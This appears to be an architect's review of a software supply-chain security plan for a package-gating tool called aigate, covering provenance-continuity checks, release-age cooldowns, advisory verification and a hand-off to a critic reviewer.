The design is correctly formulated as "flag on provenance CHANGE, not on provenance ABSENCE." Making absence force LLM consensus would degrade UX catastrophically — per [Trail of Bits "Are we PEP 740 yet?"](https://trailofbits.github.io/are-we-pep740-yet/) and the [PyPI adoption blog](https://blog.pypi.org/posts/2024-11-14-pypi-now-supports-digital-attestations/), ~75-85% of PyPI packages have no prior attestations, so absence-forces-LLM would push ~80% of short-circuit-eligible traffic to full consensus, killing the performance premise of short-circuit. The correct scope is: (i) gate catches provenance-DROP (Axios Mar-2026 class: had OIDC, suddenly doesn't); (ii) for packages that never had attestations, OTHER gates do the work (`min_pkg_age_days`, `min_num_releases`, `maintainer_set_changed`, `min_version_age_days: 7`); (iii) as ecosystem adoption grows from ~5% → target 50%+ over 2026-2028, the gate's coverage grows automatically without a code change. This is the right tradeoff — false-positive cost is near-zero today but detection grows monotonically as PEP 740 adoption grows.

### 3. Fresh web findings (iter-3)

| Topic | URL | Date checked | Finding |
|---|---|---|---|
| skops 0.12.0 fix commit `0aeca05` | [skops commit 0aeca05](https://github.com/skops-dev/skops/commit/0aeca055509dfb48c1506870aabdd9e247adf603) | 2026-04-22 | CONFIRMED — "ENH harden Method and Operator node audits (#482)"; fix covers both CVE-2025-54412 (`OperatorFuncNode`) AND companion `MethodNode` advisory GHSA-4v6w-xpmh-gfgp. Plan's pin to `>=0.12.0` closes both. |
| GHSA-m7f4-hrc6-fwg3 advisory | [GitHub Advisory](https://github.com/advisories/GHSA-m7f4-hrc6-fwg3) | 2026-04-22 | CONFIRMED — CVSS 8.7, published 2025-07-25, patched in 0.12.0. |
| npm `min-release-age` in 11.10.0 | [Socket.dev npm writeup](https://socket.dev/blog/npm-introduces-minimumreleaseage-and-bulk-oidc-configuration) | 2026-04-22 | CONFIRMED shipped Feb 2026, 7-day default matches ecosystem. **NEW finding: npm's implementation lacks the per-package exclusion mechanism that pnpm supports** (open [issue #8979](https://github.com/npm/cli/issues/8979)). Not a plan blocker — aigate is downstream of package-manager config, doesn't need to replicate the exemption mechanism. |
| Axios Mar 2026 compromise | [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/axios-npm-supply-chain-compromise/) | 2026-04-22 | CONFIRMED — March 31 2026, 2-second RAT activation at install-time. Validates `min_version_age_days: 7` as the correct primary defense. |
| PEP 740 adoption Apr 2026 | [PyPI blog 2024-11-14](https://blog.pypi.org/posts/2024-11-14-pypi-now-supports-digital-attestations/), [Trail of Bits tracker](https://trailofbits.github.io/are-we-pep740-yet/) | 2026-04-22 | CONFIRMED-LIMITED — ~5% of top-360 at GA; no fresh 2026-Q1 numbers published. Plan's 15-25% estimate is extrapolation; NOT contradicted. |
| New skops CVEs 2026 | general NVD/CVE search | 2026-04-22 | NONE FOUND — no skops-specific 2026 CVEs surfaced. 0.12.0 pin holds. |
| No 8+-day delayed attacks specifically defeating minimumReleaseAge | ecosystem search | 2026-04-22 | NONE DOCUMENTED — all major 2025-2026 npm compromises (chalk, debug, Axios, Sygnia-reported) were fast-exploit (<24h). Validates Class-D-Tail as a tail risk, not a dominant pattern. |

### 4. New concerns from iter-3 revisions

- **Plan-size coherence (7,395 → 10,975 words, +48%):** read end-to-end; the iter-3 additions are localized to Section 3 (hard gates), Section 4 (pre-mortem Scenario 5), Section 6 (test list), Section 9 (PR-4), Section 11 (config YAML), and the External Verification Log. No contradictions introduced. One minor redundancy: the 7-day-cooldown rationale is restated ~4 times across the plan (acceptable for a security design doc where redundancy aids auditors).
- **`require_provenance_continuity` data dependency:** L225 correctly enumerates the new `PackageInfo.prior_provenance: dict | None` field and specifies the data sources (npm `packument.versions[v].dist.attestations` for OIDC, PyPI `/simple/<pkg>/` PEP 740 JSON). L223 consensus.py hard-gate resolver reads from this field. **This IS a new field aigate doesn't currently resolve** — it requires registry-client work in PR-4. Plan accounts for this in the +250 LOC / +0.5 day estimate for PR-4. Not a blocker; well-scoped.
- **Fixture realism:** PR-4 test list uses hypothetical `chalk@5.3.0-malicious` and `axios@1.14.1` fixtures, not the actual published tampered tarballs (which may not be redistributable). This is correct — reproducing real tampered tarballs in a test fixture would itself be a supply-chain risk. Functional-equivalent synthetic fixtures are the right call.

### 5. Principle-violation re-check (deliberate mode)

| Principle | Status |
|---|---|
| Local-first + offline-capable | PRESERVED — skops.io + SHA256 + empty whitelist all work offline. |
| No network dep at runtime | PRESERVED — `require_provenance_continuity` reads from `PackageInfo` which is already resolved upstream; no new runtime net call inside the gate itself (registry call was already needed for `min_pkg_age_days`). |
| Never execute package code | PRESERVED — Class-D-Tail explicitly documents that behavioral-at-install sandboxing is out of scope. |
| Flexibility by composition, not special-case flags | PRESERVED — new gates are additions to the existing `short_circuit.hard_gates` composition, not new modes. |
| Evidence before claim | PRESERVED — External Verification Log updated with advisory URLs + dates + commit SHAs. |
| No self-approval within same context | PRESERVED — this Architect review is the non-authoring pass before Critic. |

**No principle violations detected in iter-3.**

### 6. Consensus Addendum

- **Antithesis (steelman) against APPROVE:** A purist could argue that `require_provenance_continuity: true` creates a "silent failure" surface area: operators reading the plan may believe provenance-continuity is enforced everywhere when it is actually a no-op for ~80% of packages, potentially leading to false security posture in compliance audits. Counter: the plan explicitly documents this adoption-gap behavior in three places (L225 config schema, L335 YAML comment, L581 iter-3 table), and adoption will grow monotonically. The audit-posture concern is addressable via a `aigate doctor` stats line ("X% of checks had prior_provenance data available") — this is a polish item for v0.7, not a v0.6 blocker.
- **Tradeoff tension:** Short-circuit performance (80%+ target) vs. Class-D-Tail coverage. Making `require_provenance_continuity` strict-on-absence would collapse short-circuit rate to ~15-20% (Trail of Bits adoption data). Plan correctly chooses performance now + growing coverage over strictness now + broken UX. Tension acknowledged and resolved with written rationale.
- **Synthesis:** No alternative design beats the current one given PEP 740 adoption reality. Holding shadow mode open past Stage-1 with the retroactive-net-wiring proof (my tightening recommendation in §2b) synthesizes the tension: ship performance now, but require observed-not-just-unit-tested retroactive coverage before promotion.
- **Principle violations (deliberate mode):** NONE.

### 7. Top remaining issues (none blocking)

1. **Non-blocking polish:** Stage-1 promotion checklist should require the retroactive OSV+Aikido pipeline to have caught ≥1 real malicious package during shadow weeks (proof of day-8+ net is operational, not just unit-tested). One checklist line. Critic can note this or it can land in a follow-up PR-template change.
2. **Non-blocking (future):** `aigate doctor` stat reporting "% of checks with prior_provenance data available" would help operators calibrate their security posture as PEP 740 adoption grows. Roadmap v0.7.

### 8. Verdict

**APPROVE-FOR-CRITIC.** Both iter-2 blockers resolved with correct scope, evidence, and acknowledged residuals. All four non-blocking items landed. Fresh web checks confirm skops 0.12.0 is the correct pin and no 2026 bypasses of empty-whitelist or minimumReleaseAge-class cooldowns exist in the wild. Plan remains coherent at 10,975 words. The two remaining non-blocking polish items (Stage-1 retroactive-wiring proof, doctor stat line) are not architecture gaps and do not justify an iter-4.

### 9. Handoff to Critic

Plan is ready for Critic evaluation. Focus areas: (i) whether the Stage-1 evidence gates are quantitatively strong enough (PR-AUC ≥ 0.95, Brier ≤ 0.05, ≥50K events, ≥4 weeks) given the Class-D-Tail residual, and (ii) whether the 7-PR sequencing + 3-lane calendar (~8.5-9.5 days) is realistic given the +250 LOC / +0.5 day PR-4 expansion for registry-client `prior_provenance` resolution work.
